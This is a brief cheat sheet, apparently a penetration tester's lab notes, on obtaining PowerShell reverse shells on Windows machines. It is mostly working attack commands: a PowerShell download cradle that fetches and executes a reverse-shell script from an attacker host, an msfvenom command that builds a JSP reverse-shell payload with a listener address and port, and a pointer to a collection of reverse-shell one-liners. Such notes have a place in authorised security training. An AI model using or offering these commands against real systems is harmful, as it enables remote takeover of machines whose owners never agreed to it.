# Get a powershell shell instead of a cmd shell

Use Invoke-PowerShellTcp.ps1 in a download cradle and put your IP and PORT at the end of the file

Example: using a msfvenom command shellcode which executes the download cradle

# Powershell download cradle both downloads and executes powershell script!

**powershell.exe iex (New-Object Net.Webclient).DownloadString('http://attacker_url/reverse_shell.ps1')**

This implies that you can have a reverse shell from a webshell on windows system, with powershell (similar to having a revshell from webshell in linux with bash one-liner)

# We can create our own web reverse shells with msfvenom:

**msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.26 lport=1234 -f jsp > mine.jsp**

# One-liner reverse shells once we have command execution:

see https://krober.biz/misc/reverse_shell.php (if we have command execution we can launch a revshell with these)
